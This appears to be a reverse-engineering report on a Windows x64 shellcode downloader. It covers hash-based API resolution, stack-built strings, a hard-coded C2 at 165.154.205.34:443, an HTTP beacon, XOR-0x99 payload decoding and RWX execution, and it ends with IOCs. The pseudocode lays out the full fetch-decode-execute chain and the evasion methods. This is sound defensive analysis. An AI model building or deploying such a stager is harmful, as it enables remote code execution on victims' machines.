## Executive summary

This is a **Windows x64 PE executable that behaves like a staged downloader / shellcode loader**. It does not contain the final payload. Instead it:

1. Dynamically resolves Windows APIs by hash through the PEB export tables.
2. Builds a hard-coded C2 address on the stack: **165.154.205.34:443**.
3. Connects over **plain TCP** to port 443.
4. Sends an HTTP `GET` beacon containing the victim/C2 IP and some parameters.
5. Reads the HTTP response headers until `\r\n\r\n`.
6. Allocates a large **RWX** buffer.
7. Receives the response body, **XOR-decodes every byte with `0x99`**, and executes it as shellcode.

It also creates/checks a marker-like path ending in `log_de.log`, probably as a one-shot or single-instance gate.

---

## 1. File format and metadata

- **Type:** PE32+ / Windows x64 executable
- **DOS header + `PE\0\0` signature** at `0xC0`
- **Machine:** `0x8664` = AMD64
- **Number of sections:** 3
- **Subsystem:** `2` = Windows GUI
- **Image base:** `0x140000000`
- **Entry point RVA:** `0x1000`
- **Image size:** `0x4000`
- **Section alignment / file alignment:** `0x1000` / `0x200`
- **Timestamp:** `0x653A75FE` = approximately **2023-10-26 14:21:50 UTC**
- **DLL characteristics:** includes dynamic base, NX compatibility, high-entropy VA
- **Sections:**
  - `.text` — code, RVA `0x1000`
  - `.rdata` — import table / IAT / debug-ish data, RVA `0x2000`
  - `.pdata` — exception data, RVA `0x3000`

### Imports

The only normal static import is:

- `KERNEL32.dll!Sleep`

Everything else is resolved manually at runtime. This is deliberate: the binary avoids an import table that would reveal networking, memory-allocation, and string-formatting APIs.

The `Sleep` import is used in the TCP connect retry loop.

---

## 2. API resolution technique

The main routine is at RVA `0x1000`. It uses a Metasploit-style hash resolver.

The resolver:

- Reads the PEB through `gs:[0x60]`
- Follows `PEB->Ldr->InLoadOrderModuleList`
- Walks loaded modules
- Reads each module’s export directory
- Hashes module names and export names with a ROR13-style rolling hash
- Combines the module hash and function hash
- Returns the matching function pointer

This is why the dump contains many `mov ecx, <hash>` + `call resolver` sequences instead of named imports.

The hash constants map to the following APIs:

| Hash | API |
|---|---|
| `0x0726774c` | `LoadLibraryA` |
| `0x006b8029` | `WSAStartup` |
| `0xe0df0fea` | `socket` |
| `0x6174a599` | `connect` |
| `0x5f38ebc2` | `send` |
| `0xe553a458` | `VirtualAlloc` |
| `0x5fc8d902` | `recv` |
| `0x614d6e75` | `closesocket` |
| `0x803428a9` | `gethostbyname` |
| `0x4d7b1e12` | `inet_addr` |
| `0xd0eb608d` | `sprintf` |
| `0xe449f330` | `GetCurrentDirectoryA` |
| `0x70f2fa31` | path/directory API, most consistent with `CreateDirectoryA` |

Immediately after resolving `LoadLibraryA`, it loads:

- `User32.dll`
- `ws2_32.dll`
- `msvcrt.dll`

`ws2_32.dll` provides the networking APIs, and `msvcrt.dll` provides `sprintf`. `User32.dll` does not appear to be used later; it may be loaded for environmental compatibility or as noise.

---

## 3. String obfuscation

Almost every meaningful string is built on the stack from small fragments.

### Library names

Constructed as:

- `"User32.dll"`
- `"ws2_32.dll"`
- `"msvcrt.dll"`

### C2 IP address

The IP address is split into pieces:

- `"165."`
- `"154."`
- `"205."`
- `"34"`

These are combined with `sprintf` into:

**`165.154.205.34`**

### Log/marker path

The binary calls:

```c
GetCurrentDirectoryA(0x80, buffer);
sprintf(buffer, "%s%s%s", buffer, "log_de.", "log");
```

This produces a path ending in:

**`log_de.log`**

There is no explicit backslash inserted between the current directory and `log_de.log`, so unless the current directory already ends with a separator, the name is concatenated directly to it.

It then calls the hash-resolved path API with this path and a `NULL` second argument. The return value is tested; if it is zero, the program jumps to cleanup/exit. The call pattern strongly resembles:

```c
CreateDirectoryA(path, NULL)
```

used as a one-shot marker or single-instance gate. If so, execution only continues if the directory/marker is successfully created.

### HTTP request fragments

The binary builds an HTTP request from stack strings, including:

```text
GET /?a
=w64&fh=
&t=ws_&
p=%d HT
TP/1.1\r
\nHost: 
%s:%d\r\n
\r\n\r\n
```

The resulting request line is approximately:

```http
GET /?a=w64&fh=165.154.205.34&t=ws_&p=443 HTTP/1.1
```

The `Host` header is approximately:

```http
Host: 165.154.205.34:443
```

### User-Agent

The User-Agent is assembled from many fragments. The fragments are intended to resemble:

```text
Mozilla/5.0 (Windows NT 6.1; rv:48.0) Gecko/20100101 Firefox/48.0
```

Because the fragments are split into fixed-width stack chunks, the exact concatenation in memory contains inserted spaces, producing something close to:

```text
User-Agent: Mozilla/5.0 (Windows NT 6.1; r v:48.0 ) Geck o/2010 0101 F irefox /48.0
```

Functionally, it is a spoofed Firefox 48 / Windows 7 user agent, assembled in pieces to avoid easy static-string detection.

---

## 4. Execution flow

### Step 1 — Resolve and load libraries

```c
LoadLibraryA = resolve(0x0726774c);
LoadLibraryA("User32.dll");
LoadLibraryA("ws2_32.dll");
LoadLibraryA("msvcrt.dll");
```

### Step 2 — Resolve further APIs

The binary resolves the networking, memory-allocation, formatting, and path APIs listed above.

### Step 3 — Marker / one-shot gate

```c
GetCurrentDirectoryA(0x80, cwd);
sprintf(cwd, "%s%s%s", cwd, "log_de.", "log");
if (CreateDirectoryA_like(cwd, NULL) == 0)
    return;
```

The exact path API is hash-resolved, but the call shape and failure test are consistent with a marker-directory check.

### Step 4 — Build the C2 address

```c
ip = "165." + "154." + "205." + "34";
```

Result:

**`165.154.205.34`**

### Step 5 — Initialize Winsock

```c
WSAStartup(0x202, &wsaData);
```

If this fails, the program exits.

### Step 6 — Create TCP socket

```c
s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
```

That is:

```c
socket(2, 1, 6);
```

### Step 7 — Build `sockaddr_in`

The code writes:

- address family: `AF_INET` = 2
- port bytes: `01 BB` in network order = **443**
- address from `gethostbyname(ip)`, or fallback to `inet_addr(ip)`

So the actual TCP destination is:

**`165.154.205.34:443`**

### Step 8 — Connect with retry

```c
while (connect(s, &addr, 16) != 0) {
    Sleep(10000);
}
```

It retries every 10 seconds until the connection succeeds.

### Step 9 — Send HTTP beacon

It builds the HTTP request described above and sends it with:

```c
send(s, request, 0x400, 0);
```

The length is hard-coded to `0x400` bytes, so it sends 1024 bytes from the request buffer, even if the meaningful request is shorter.

### Step 10 — Read HTTP response headers

It allocates a small buffer and reads the response one byte at a time:

```c
recv(s, header_buf + total, 1, 0);
```

It looks for the end-of-headers sequence:

```text
\r\n\r\n
```

It stops reading headers when it finds this sequence or when `recv` fails/returns zero.

### Step 11 — Allocate executable stage-2 memory

It then allocates a large buffer:

```c
VirtualAlloc(NULL, 0x01C9C380, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```

`0x01C9C380` = **30,000,000 bytes**.

The allocation is both writable and executable, which is the classic shellcode-loader pattern.

### Step 12 — Receive and XOR-decode the payload

It receives the HTTP body in chunks of up to `0x64000` bytes:

```c
while (recv(s, buf + total, 0x64000, 0) > 0) {
    for each received byte:
        buf[i] ^= 0x99;
    total += received;
}
```

So the downloaded payload is **XOR-encoded with key `0x99`**.

### Step 13 — Close socket and execute payload

After the connection ends:

```c
closesocket(s);
((void(*)())buf)();
```

It calls the decoded buffer directly. This makes the binary a **download-and-execute stager**.

---

## 5. Network behavior summary

- **Destination:** `165.154.205.34`
- **Port:** `443`
- **Protocol:** plain TCP, but the application data is **HTTP**, not TLS
- **Request:** HTTP `GET`
- **URI/query pattern:**

```text
/?a=w64&fh=165.154.205.34&t=ws_&p=443
```

- **User-Agent:** fake Firefox 48 / Windows NT 6.1 string
- **Response handling:** reads HTTP headers, then treats the body as XOR-0x99-encoded shellcode
- **Execution:** stage-2 shellcode runs directly from `VirtualAlloc` RWX memory

The query parameters appear to encode architecture and transport information:

- `a=w64` — likely “architecture = Windows 64-bit”
- `fh=` — host/IP value
- `t=ws_` — likely transport / Winsock marker
- `p=443` — port

---

## 6. Likely purpose

This is not a normal application. It is a **custom or Metasploit-derived x64 shellcode downloader/stager**.

Its purpose is to:

1. Avoid static detection by resolving APIs by hash.
2. Avoid obvious strings by splitting the IP, User-Agent, request format, and log path across stack fragments.
3. Contact a hard-coded C2 over TCP/443 using HTTP.
4. Download a second-stage payload.
5. Decode that payload with a single-byte XOR (`0x99`).
6. Execute it in RWX memory.

The final payload is not present in this file. The binary is only the loader.

---

## 7. Notable indicators / IOCs

- **C2 IP:** `165.154.205.34`
- **C2 port:** `443/TCP`
- **HTTP URI pattern:** `/?a=w64&fh=165.154.205.34&t=ws_&p=443`
- **Spoofed UA:** Firefox 48 / Windows NT 6.1 fragments
- **Marker path fragment:** `log_de.log`
- **Stage-2 encoding:** XOR `0x99`
- **Execution:** RWX `VirtualAlloc` + direct `call`
- **Only static import:** `KERNEL32.dll!Sleep`
- **Hash resolver:** PEB walk + export parsing + ROR13-style module/function hashing

The combination of a single static `Sleep` import, stack-built strings, hash-resolved Winsock APIs, a hard-coded IP, HTTP over port 443, XOR decoding, and RWX shellcode execution is strongly characteristic of a **staged malware loader**.